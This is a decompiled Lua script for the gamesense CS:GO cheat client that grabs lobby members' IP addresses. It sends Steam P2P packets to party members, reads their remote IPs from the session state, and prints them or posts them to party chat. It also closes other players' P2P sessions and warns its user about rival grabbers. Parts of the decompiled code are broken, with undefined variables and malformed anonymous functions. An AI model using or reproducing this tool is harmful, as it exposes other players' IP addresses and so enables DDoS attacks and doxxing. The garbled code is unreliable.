slot0 = require("gamesense/steamworks")
slot1 = slot0.ISteamNetworking
slot2 = panorama.open()
slot3 = slot2["$"]
slot4 = slot2.MyPersonaAPI
slot5 = slot2.PartyListAPI
slot6 = slot2.GameStateAPI
slot7 = slot2.LobbyAPI
slot8 = slot0.EP2PSessionError
slot9 = slot0.EP2PSend
slot10 = {}
slot11 = {}
slot12 = {}
slot13, slot14, slot15, slot16 = nil
slot18 = ui.new_combobox("MISC", "Miscellaneous", "Output", {
	"Party Chat",
	"Console"
})

ui.set(slot18, "Console")
ui.set_visible(slot18, false)
ui.set_visible(ui.new_checkbox("MISC", "Miscellaneous", "Mask IPs"), false)
ui.set_visible(ui.new_button("MISC", "Miscellaneous", "Grab", function ()
	uv0()
end), false)
ui.set_callback(ui.new_checkbox("MISC", "Miscellaneous", "Lobby IP Grabber"), function (slot0)
	slot1 = ui.get(slot0)

	ui.set_visible(uv0, slot1)
	ui.set_visible(uv1, slot1)
	ui.set_visible(uv2, slot1)
end)

function slot21(...)
	if ui.get(uv0) == "Console" then
		print(table.concat(table.pack(...), " "))
	elseif slot0 == "Party Chat" then
		uv1(slot2)
	end
end

slot0.set_callback("P2PSessionRequest_t", function (slot0)
	slot1, slot2 = uv0.GetP2PSessionState(slot0.m_steamIDRemote)

	if not uv1.IsPartyMember(tostring(slot0.m_steamIDRemote)) then
		return
	end

	slot10 = ") might be trying to steal your ip!"

	print("[POTENTIAL GRABBER] ", uv2.GetFriendName(slot3), " (", slot0.m_steamIDRemote, slot10)

	for slot10 = 1, 10 do
		client.delay_call(slot5 == 1 and 0 or (slot10 - 1) * 10 / 1000, function ()
			uv0.DispatchEvent("PlaySoundEffect", "container_weapon_ticker", "MOUSE")
		end)
	end
end)

function slot13()
	uv0 = {}
	uv1 = {}
	uv2 = {}
	uv3 = true

	for slot3 = 0, uv4.GetCount() - 1 do
		if uv4.GetXuidByIndex(slot3):len() > 7 and slot4 ~= uv5.GetXuid() then
			slot5 = uv6.SteamID(slot4)
			uv0[#uv0 + 1] = slot5
			uv1[slot5] = uv4.GetFriendName(slot4)

			uv7.SendP2PPacket(slot5, "asdf", 4, uv8.UnreliableNoDelay, 0)
		end
	end

	uv9("[[ IP GRABBER ]]")
	uv9("# Added " .. #uv0 .. " to queue!")
	uv9("# Waiting 5 secs...")
	client.delay_call(5, function ()
		uv0 = false
		slot1 = (ui.get(uv1) == "Party Chat" and "𝗪𝗔𝗡" or "WAN") .. ": "
		slot2 = (slot0 == "Party Chat" and "𝗟𝗔𝗡" or "LAN") .. ": "

		for slot6, slot7 in pairs(uv2) do
			for slot12, slot13 in ipairs(slot7) do
				slot8 = "" .. (#slot7 == 1 and slot1 or slot12 == 1 and slot2 or slot1) .. uv3(slot13, ui.get(uv4)) .. (#slot7 == 1 and "" or slot12 == 1 and " | " or "")
			end

			slot9, slot10 = renderer.measure_text(nil, uv5[slot6])

			uv6(string.sub(uv5[slot6], 1, 25) .. ":", slot8)
		end
	end)
end

slot22 = {
	["76561198108791626"] = true,
	["76561198237598500"] = true,
	["76561198089758951"] = true,
	["76561198861797912"] = true,
	["76561198148192561"] = true
}

function ()
	for slot3, slot4 in ipairs(uv0) do
		slot5, slot6 = uv1.GetP2PSessionState(slot4)

		if slot6.m_nRemoteIP ~= 0 then
			uv2[slot4] = uv2[slot4] or {}
			slot7 = false

			for slot11, slot12 in ipairs(uv2[slot4]) do
				if slot12 == slot6.m_nRemoteIP then
					slot7 = true
				end
			end

			if not slot7 and not uv3[tostring(slot4)] then
				table.insert(uv2[slot4], slot6.m_nRemoteIP)
			end
		end
	end

	client.delay_call(0.25, uv4)
end()
function ()
	if uv0.IsSessionActive() and not uv1 then
		for slot3 = 0, uv2.GetCount() - 1 do
			if uv2.GetXuidByIndex(slot3):len() > 7 and slot4 ~= uv3.GetXuid() then
				uv5.CloseP2PSessionWithUser(uv4.SteamID(slot4))
			end
		end
	end

	client.delay_call(0.01, uv6)
end()

function slot14(slot0)
	uv0.SessionCommand("Game::Chat", string.format("run all xuid %s chat %s", uv1.GetXuid(), slot0:gsub(" ", " ")))
end

function slot15(slot0, slot1)
	slot0 = tonumber(slot0)
	slot2 = math.floor(slot0 / 16777216)
	slot3 = math.floor((slot0 - slot2 * 16777216) / 65536)
	slot5 = math.floor(slot0 - slot2 * 16777216 - slot3 * 65536 - math.floor((slot0 - slot2 * 16777216 - slot3 * 65536) / 256) * 256)

	if slot1 then
		return slot2 .. "." .. slot3 .. ".xxx.xxx"
	end

	return slot2 .. "." .. slot3 .. "." .. slot4 .. "." .. slot5
end
